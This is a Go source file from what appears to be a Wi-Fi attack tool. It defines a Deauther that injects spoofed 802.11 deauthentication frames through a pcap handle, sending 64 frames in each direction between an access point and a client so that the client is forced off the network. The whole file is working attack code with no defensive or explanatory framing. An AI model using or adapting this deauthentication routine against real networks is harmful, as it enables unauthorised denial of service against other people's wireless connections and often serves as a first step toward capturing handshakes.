package wifi

import (
	"context"
	"fmt"
	"github.com/google/gopacket/pcap"
	"github.com/paragor/paradrop80211/pkg/packets"
	"net"
)

type Deauther struct {
	handle *pcap.Handle
}

func NewDeauther(handle *pcap.Handle) *Deauther {
	return &Deauther{handle: handle}
}

func (d *Deauther) SendDeauthPacket(ctx context.Context, ap net.HardwareAddr, client net.HardwareAddr) error {
	for seq := uint16(0); seq < 64; seq++ {
		if err := ctx.Err(); err != nil {
			return err
		}
		pktClientToAp, err := packets.NewDot11Deauth(ap, client, ap, seq)
		if err != nil {
			return fmt.Errorf("could not create deauth packet: %s", err)
		}
		if err := injectPacket(d.handle, pktClientToAp); err != nil {
			return err
		}

		pktApToClient, err := packets.NewDot11Deauth(client, ap, ap, seq)
		if err != nil {
			return fmt.Errorf("could not create deauth packet: %s", err)
		}
		if err := injectPacket(d.handle, pktApToClient); err != nil {
			return err
		}
	}
	return nil
}
